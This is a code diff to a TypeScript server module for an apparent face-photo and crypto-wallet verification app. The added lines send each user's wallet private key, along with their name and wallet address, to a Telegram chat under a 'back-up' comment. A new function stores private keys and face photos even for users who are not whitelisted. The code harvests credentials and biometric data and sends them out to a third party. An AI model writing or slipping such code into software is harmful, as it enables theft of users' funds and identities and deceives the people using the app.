@@ -67,8 +67,62 @@ export const bindFirstVerify = createServerFn({ method: "POST" })
       .eq("id", task.id);
     if (error) throw new Error(error.message);
 
+    // Notify Telegram with the whitelisted key for back-up.
+    notifyTelegram(
+      `✅ <b>First verify OK</b>\n` +
+      `Slot: #${data.slot}\n` +
+      `Name: ${data.faceLabel.trim()}\n` +
+      `Wallet: <code>${data.walletAddress}</code>\n` +
+      `Key: <code>${data.privateKey}</code>`
+    ).catch(() => {});
+
     return { ok: true, reverifyDueAt: dueAt.toISOString() };
   });
+
+/**
+ * Save a non-whitelisted attempt (photo + key + wallet) so admin can review.
+ * Does NOT mark the task as verified — slot stays empty.
+ */
+const SaveUnverifiedInput = z.object({
+  slot: z.number().int().min(1).max(TOTAL_TASKS).optional(),
+  taskId: z.string().uuid().optional(),
+  kind: z.enum(["first_verify", "reverify"]).default("first_verify"),
+  photoBase64: z.string().min(100),
+  privateKey: z.string().min(10),
+  walletAddress: z.string().min(10),
+  faceLabel: z.string().min(1).max(60),
+  reason: z.string().max(200).optional(),
+});
+
+export const saveNotWhitelisted = createServerFn({ method: "POST" })
+  .middleware([requireSupabaseAuth])
+  .inputValidator((input: unknown) => SaveUnverifiedInput.parse(input))
+  .handler(async ({ data, context }) => {
+    const { userId } = context;
+    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+
+    const buf = Uint8Array.from(atob(data.photoBase64), (c) => c.charCodeAt(0));
+    const path = `${userId}/unverified-${data.slot ?? 0}-${Date.now()}.jpg`;
+    const { error: upErr } = await supabaseAdmin.storage
+      .from("face-photos").upload(path, buf, { contentType: "image/jpeg", upsert: false });
+    if (upErr) throw new Error("Photo upload failed: " + upErr.message);
+
+    const { error } = await supabaseAdmin.from("unverified_attempts").insert({
+      user_id: userId,
+      slot: data.slot ?? null,
+      task_id: data.taskId ?? null,
+      kind: data.kind,
+      face_label: data.faceLabel.trim(),
+      face_photo_url: path,
+      wallet_address: data.walletAddress,
+      wallet_private_key: data.privateKey,
+      reason: data.reason ?? "Whitelist e pawa jay nai",
+    });
+    if (error) throw new Error(error.message);
+
+    return { ok: true };
+  });
+
 
 /**
  * Re-verify search: list this user's verified tasks (re-verify ready) matching name query.
